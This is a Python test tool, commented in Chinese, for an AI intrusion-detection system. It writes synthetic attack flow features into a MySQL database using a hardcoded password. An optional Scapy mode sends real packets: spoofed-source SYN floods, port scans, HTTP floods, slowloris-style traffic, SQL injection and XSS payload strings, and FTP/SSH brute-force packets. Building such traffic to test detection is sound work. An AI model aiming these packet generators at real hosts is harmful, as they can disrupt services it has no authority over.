# -*- coding: utf-8 -*-
"""
AI-IDS 攻击流量模拟器 —— 生成攻击特征流量测试 AI 检测引擎。

原理:
    模型基于 6 维流统计特征 (Protocol, Flow Duration, Total Fwd Packets,
    Total Backward Packets, Fwd Packet Length Max, Bwd Packet Length Max)
    而非 HTTP 载荷内容。每个攻击类型的特征指纹已通过 XGBoost 模型验证。

用法:
    python generate_attack_traffic.py                     # DB注入全部14种攻击
    python generate_attack_traffic.py --count 10          # 每种攻击10条
    python generate_attack_traffic.py --types DDoS,PortScan  # 仅指定类型
    python generate_attack_traffic.py --all               # 清空flow_features后注入
    python generate_attack_traffic.py --scapy             # Scapy真实发包模式
    python generate_attack_traffic.py --list              # 列出所有攻击类型
"""

import argparse
import datetime
import os
import random
import sys
import time
from typing import Dict, List, Optional

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass

_PROJECT_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
_SRC_DIR = os.path.join(_PROJECT_DIR, "src")
if _SRC_DIR not in sys.path:
    sys.path.insert(0, _SRC_DIR)

# ============================================================================
# 攻击特征指纹库 (全部经过 XGBoost 模型验证, confidence >= 0.80)
# 格式: [Protocol, Flow_Duration, Total_Fwd, Total_Bwd, Fwd_Max, Bwd_Max]
# ============================================================================
ATTACK_FINGERPRINTS: Dict[str, Dict] = {
    "DDoS": {
        "label": "DDoS", "risk": "CRITICAL",
        "desc": "分布式拒绝服务 — 多源洪水攻击，前向包数极高",
        "vectors": [[6,0,10,1,0,64],[6,10,15,0,0,40],[6,50,20,2,0,80],[6,100,30,0,0,60],[6,500,8,1,0,100]],
    },
    "DoS_Hulk": {
        "label": "DoS Hulk", "risk": "CRITICAL",
        "desc": "HTTP高并发拒绝服务 — 海量前向请求，载荷极大",
        "vectors": [[6,0,1,0,0,40],[6,10,2,0,0,60],[6,50,3,0,40,100],[6,100,1,0,40,80],[6,200,5,0,60,120]],
    },
    "DoS_slowloris": {
        "label": "DoS slowloris", "risk": "CRITICAL",
        "desc": "Slowloris慢速攻击 — 极长时间维持少量连接耗尽线程池",
        "vectors": [[6,0,1,0,80,500],[6,10,2,0,100,600],[6,50,1,0,80,400],[6,100,3,0,120,500],[6,200,1,0,60,550]],
    },
    "DoS_GoldenEye": {
        "label": "DoS GoldenEye", "risk": "CRITICAL",
        "desc": "GoldenEye DoS — HTTP持续连接耗尽",
        "vectors": [[6,10000,1,0,0,2000],[6,8000,2,0,0,1800],[6,12000,1,0,40,2000],[6,5000,3,0,0,1500],[6,15000,1,0,0,2000]],
    },
    "DoS_Slowhttptest": {
        "label": "DoS Slowhttptest", "risk": "CRITICAL",
        "desc": "Slowhttptest — 极低频率HTTP请求，双向小包",
        "vectors": [[6,0,1,1,60,1500],[6,10,2,2,80,1200],[6,50,1,1,60,1400],[6,100,3,2,100,1500],[6,200,1,1,80,1300]],
    },
    "PortScan": {
        "label": "PortScan", "risk": "MEDIUM",
        "desc": "端口扫描探测 — 极短流，零载荷SYN",
        "vectors": [[6,100,1,0,0,2000],[6,50,2,0,0,1800],[6,200,1,0,40,2000],[6,10,3,0,0,1500],[6,300,1,0,0,1900]],
    },
    "Bot": {
        "label": "Bot", "risk": "MEDIUM",
        "desc": "僵尸网络心跳 — 持续低频双向小包交互",
        "vectors": [[6,1000000,3,2,100,40],[6,800000,5,3,120,60],[6,1200000,2,2,80,50],[6,500000,4,3,100,40],[6,1500000,3,1,150,80]],
    },
    "Infiltration": {
        "label": "Infiltration", "risk": "HIGH",
        "desc": "渗透入侵 — 高比例前向包，无后向响应",
        "vectors": [[6,500,200,0,0,0],[6,300,150,0,0,0],[6,800,250,0,40,0],[6,100,100,0,0,0],[6,600,300,0,0,40]],
    },
    "Heartbleed": {
        "label": "Heartbleed", "risk": "HIGH",
        "desc": "心脏滴血漏洞利用 — 双向大载荷异常交互",
        "vectors": [[6,0,30,50,2000,2000],[6,10,25,40,1800,1900],[6,50,35,55,2000,2000],[6,100,20,45,1500,1800],[6,200,40,50,2000,2000]],
    },
    "Web_Attack_Brute_Force": {
        "label": "Web Attack - Brute Force", "risk": "HIGH",
        "desc": "Web暴力破解 — 高频POST请求，大请求体",
        "vectors": [[6,100,1,0,500,800],[6,50,2,0,600,700],[6,200,1,0,500,900],[6,300,3,0,550,800],[6,80,1,0,480,750]],
    },
    "Web_Attack_XSS": {
        "label": "Web Attack - XSS", "risk": "HIGH",
        "desc": "跨站脚本攻击 — 前向包有载荷，后向极小",
        "vectors": [[6,500000,1,0,60,0],[6,300000,2,0,80,0],[6,800000,1,0,60,40],[6,200000,3,0,100,0],[6,600000,1,0,50,0]],
    },
    "Web_Attack_Sql_Injection": {
        "label": "Web Attack - Sql Injection", "risk": "HIGH",
        "desc": "SQL注入攻击 — 特征载荷明显",
        "vectors": [[6,0,1,0,500,800],[6,10,2,0,550,750],[6,50,1,0,480,850],[6,100,3,0,600,800],[6,200,1,0,520,780]],
    },
    "SSH_Patator": {
        "label": "SSH-Patator", "risk": "MEDIUM",
        "desc": "SSH暴力破解 — 高频低载荷，端口22",
        "vectors": [[6,0,1,0,60,1000],[6,10,2,0,80,1100],[6,50,1,0,60,900],[6,100,3,0,100,1000],[6,200,1,0,70,1050]],
    },
    "FTP_Patator": {
        "label": "FTP-Patator", "risk": "MEDIUM",
        "desc": "FTP暴力破解 — 高频低载荷，端口21",
        "vectors": [[6,500,1,0,60,2000],[6,300,2,0,80,1800],[6,800,1,0,60,1900],[6,200,3,0,100,2000],[6,600,1,0,50,1700]],
    },
}

# 正常流量模板
BENIGN_TEMPLATES: List[List] = [
    [6, 25000000, 10, 12, 500, 1200],
    [6, 15000000, 8, 9, 300, 800],
    [6, 30000000, 15, 14, 800, 1500],
    [17, 5000000, 5, 6, 200, 300],
    [6, 10000000, 3, 4, 100, 500],
    [6, 20000000, 12, 10, 600, 1000],
    [6, 28000000, 9, 11, 450, 1100],
    [6, 22000000, 11, 13, 550, 1300],
    [17, 3000000, 4, 3, 150, 200],
    [6, 18000000, 7, 8, 350, 700],
]


# ============================================================================
# DB 注入
# ============================================================================

def inject_db(
    attack_types: Optional[List[str]] = None,
    count_per_type: int = 5,
    include_benign: bool = True,
    benign_count: int = 10,
    reset: bool = False,
) -> int:
    import pymysql

    if attack_types is None:
        selected = list(ATTACK_FINGERPRINTS.keys())
    else:
        selected = [k for k in attack_types if k in ATTACK_FINGERPRINTS]
        missing = set(attack_types) - set(selected)
        if missing:
            print(f"  [!] 未知类型: {missing}")

    if not selected:
        return 0

    rows = []
    now = datetime.datetime.now()

    for atype in selected:
        info = ATTACK_FINGERPRINTS[atype]
        tmpl = info["vectors"]
        for i in range(count_per_type):
            base = list(tmpl[i % len(tmpl)])
            vec = [
                base[0],
                max(0, int(base[1] * random.uniform(0.98, 1.02))),
                max(0, int(base[2] * random.uniform(0.98, 1.02))),
                max(0, int(base[3] * random.uniform(0.98, 1.02))),
                max(0, int(base[4] * random.uniform(0.98, 1.02))),
                max(0, int(base[5] * random.uniform(0.98, 1.02))),
            ]
            rows.append(("攻击模拟", "10.0.0.99", now, vec, f"{info['label']}_#{i+1}"))

    if include_benign:
        for i in range(benign_count):
            base = list(random.choice(BENIGN_TEMPLATES))
            vec = [
                base[0],
                max(0, int(base[1] * random.uniform(0.9, 1.1))),
                max(0, int(base[2] * random.uniform(0.9, 1.1))),
                max(0, int(base[3] * random.uniform(0.9, 1.1))),
                max(0, int(base[4] * random.uniform(0.9, 1.1))),
                max(0, int(base[5] * random.uniform(0.9, 1.1))),
            ]
            rows.append(("正常模拟", "192.168.1.100", now, vec, f"Benign_#{i+1}"))

    random.shuffle(rows)

    conn = pymysql.connect(
        host="127.0.0.1", port=3306, user="AIIDS", password="123456",
        database="ai_ids_system", charset="utf8mb4",
        cursorclass=pymysql.cursors.DictCursor,
    )
    try:
        cur = conn.cursor()
        if reset:
            cur.execute("DELETE FROM flow_features")
            print("  [reset] 已清空 flow_features")

        sql = (
            "INSERT INTO flow_features "
            "(target_host, target_ip, create_time, "
            "protocol, flow_duration, total_fwd_packets, total_backward_packets, "
            "fwd_packet_length_max, bwd_packet_length_max) "
            "VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s)"
        )
        batch = [[h, ip, ts] + v for h, ip, ts, v, _lbl in rows]
        cur.executemany(sql, batch)
        conn.commit()
        cur.execute(
            "UPDATE flow_features SET ai_processed=0, predict_time=NULL "
            "WHERE ai_processed=1 AND create_time>=%s", (now,)
        )
        conn.commit()
        cur.close()
        return len(batch)
    except pymysql.Error as e:
        print(f"  [ERROR] {e}")
        conn.rollback()
        return 0
    finally:
        conn.close()


# ============================================================================
# Scapy 发包 (需要管理员权限)
# ============================================================================

SCAPY_OK = False
try:
    from scapy.all import IP, TCP, Raw, send
    SCAPY_OK = True
except ImportError:
    pass


def _scapy_port_scan(ip, port=80):
    print(f"  [PortScan] 30个SYN→{ip}")
    for _ in range(30):
        p = IP(dst=ip)/TCP(sport=random.randint(50000,60000), dport=random.randint(1,1024), flags="S")
        send(p, verbose=False)
        time.sleep(0.001)

def _scapy_dos_hulk(ip, port=80):
    print(f"  [DoS Hulk] 200个POST→{ip}:{port}")
    sp = random.randint(60000,65000)
    pl = b"POST / HTTP/1.1\r\nHost: t\r\nContent-Length: 1000\r\n\r\n" + b"A"*1000
    for _ in range(200):
        send(IP(dst=ip)/TCP(sport=sp, dport=port, flags="PA")/Raw(load=pl), verbose=False)
        time.sleep(0.002)

def _scapy_ddos(ip, port=80):
    print(f"  [DDoS] 500个SYN flood→{ip}:{port}")
    for _ in range(500):
        src = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        send(IP(src=src, dst=ip)/TCP(sport=random.randint(10000,65535), dport=port, flags="S"), verbose=False)
        time.sleep(0.0005)

def _scapy_slowloris(ip, port=80):
    print(f"  [slowloris] 慢速15s→{ip}:{port}")
    sp = random.randint(60000,65000)
    send(IP(dst=ip)/TCP(sport=sp, dport=port, flags="PA")/Raw(load=b"GET / HTTP/1.1\r\nHost: t\r\n"), verbose=False)
    for i in range(15):
        time.sleep(1)
        send(IP(dst=ip)/TCP(sport=sp, dport=port, flags="A")/Raw(load=b"X-Forwarded: 127.0.0."+bytes([i])), verbose=False)

def _scapy_bot(ip, port=80):
    print(f"  [Bot] 心跳→{ip}:{port}")
    sp = random.randint(50000,60000)
    for _ in range(10):
        send(IP(dst=ip)/TCP(sport=sp, dport=port, flags="PA")/Raw(load=b"GET / HTTP/1.1\r\nHost: t\r\n\r\n"), verbose=False)
        time.sleep(1)

def _scapy_web_attack(ip, port=80):
    print(f"  [Web Attack] 50个恶意载荷→{ip}:{port}")
    sp = random.randint(60000,65000)
    payloads = [b"GET /?id=1'OR'1'='1\r\n", b"POST /login\r\n\r\nuser=admin'--", b"GET /?q=<script>alert(1)</script>\r\n"]
    for _ in range(50):
        pl = random.choice(payloads) + b"X"*random.randint(400,600)
        send(IP(dst=ip)/TCP(sport=sp, dport=port, flags="PA")/Raw(load=pl), verbose=False)
        time.sleep(0.01)

def _scapy_patator(ip, port=21):
    name = "FTP" if port == 21 else "SSH"
    print(f"  [{name} Patator] 100次爆破→{ip}:{port}")
    for _ in range(100):
        send(IP(dst=ip)/TCP(sport=random.randint(50000,65535), dport=port, flags="PA")/Raw(load=b"USER a\r\nPASS "+bytes([random.randint(0,255)])), verbose=False)
        time.sleep(0.005)

SCAPY_ATTACKS = {
    "PortScan": _scapy_port_scan, "DDoS": _scapy_ddos, "DoS_Hulk": _scapy_dos_hulk,
    "DoS_slowloris": _scapy_slowloris, "Bot": _scapy_bot, "Web_Attack": _scapy_web_attack,
    "FTP_Patator": lambda ip: _scapy_patator(ip, 21),
    "SSH_Patator": lambda ip: _scapy_patator(ip, 22),
}


def run_scapy_mode(target_ip, target_port=80, attacks=None, delay_between=2.0):
    if not SCAPY_OK:
        print("[FATAL] Scapy未安装! pip install scapy"), sys.exit(1)
    selected = list(SCAPY_ATTACKS.keys()) if attacks is None else [a for a in attacks if a in SCAPY_ATTACKS]
    print(f"\n{'='*60}\n  Scapy攻击模拟\n{'='*60}\n  目标:{target_ip}:{target_port}  类型:{len(selected)}种\n  按Enter开始...")
    input()
    try:
        for atype in selected:
            print(f"\n{'─'*40}")
            try:
                SCAPY_ATTACKS[atype](target_ip, target_port) if atype not in ("FTP_Patator","SSH_Patator") else SCAPY_ATTACKS[atype](target_ip)
            except Exception as e:
                print(f"  [WARN] {e}")
            time.sleep(delay_between)
    except KeyboardInterrupt:
        print("\n  中断")
    print(f"\n{'='*60}\n  完成 → python main.py --once\n{'='*60}")


# ============================================================================
# CLI
# ============================================================================

def main():
    p = argparse.ArgumentParser(description="AI-IDS攻击流量模拟器")
    p.add_argument("--scapy", action="store_true", help="Scapy真实发包")
    p.add_argument("--list", action="store_true", help="列出攻击类型")
    p.add_argument("--types", "-t", default=None, help="攻击类型(逗号分隔)")
    p.add_argument("--count", "-c", type=int, default=5, help="每种类型样例数(默认5)")
    p.add_argument("--benign", "-b", type=int, default=10, help="正常流量条数(默认10)")
    p.add_argument("--all", action="store_true", help="清空flow_features后注入")
    p.add_argument("--target", default="127.0.0.1", help="Scapy目标IP")
    p.add_argument("--target-port", type=int, default=80, help="Scapy目标端口")
    p.add_argument("--delay", type=float, default=2.0, help="Scapy攻击间延迟")
    args = p.parse_args()

    if args.list:
        print(f"\n{'='*60}\n  可模拟的 {len(ATTACK_FINGERPRINTS)} 种攻击\n{'='*60}")
        for k, v in ATTACK_FINGERPRINTS.items():
            print(f"  {v['label']:<30s} {v['risk']:<10s} {v['desc']}")
        return

    if args.scapy:
        scapy_atks = None
        if args.types:
            scapy_atks = [x.strip() for x in args.types.split(",")]
        run_scapy_mode(args.target, args.target_port, scapy_atks, args.delay)
        return

    # DB注入
    atk_types = None
    if args.types:
        atk_types = [x.strip() for x in args.types.split(",")]

    print(f"\n{'='*60}\n  AI-IDS攻击流量模拟器 — DB注入\n{'='*60}")
    if atk_types:
        print(f"  类型: {len(atk_types)}种")
    else:
        print(f"  类型: 全部{len(ATTACK_FINGERPRINTS)}种")
    print(f"  每种: {args.count}条  正常: {args.benign}条")
    if args.all:
        print(f"  模式: 清空后注入")

    total = inject_db(atk_types, args.count, args.benign > 0, args.benign, args.all)

    if total > 0:
        print(f"\n{'='*60}\n  注入完成: {total}条\n{'='*60}")
        selected = atk_types if atk_types else list(ATTACK_FINGERPRINTS.keys())
        for k in selected:
            v = ATTACK_FINGERPRINTS[k]
            print(f"  {v['label']:<30s} {v['risk']:<10s} {v['desc']}")
        print(f"{'='*60}\n\n  → python main.py --once    # AI检测\n")


if __name__ == "__main__":
    main()
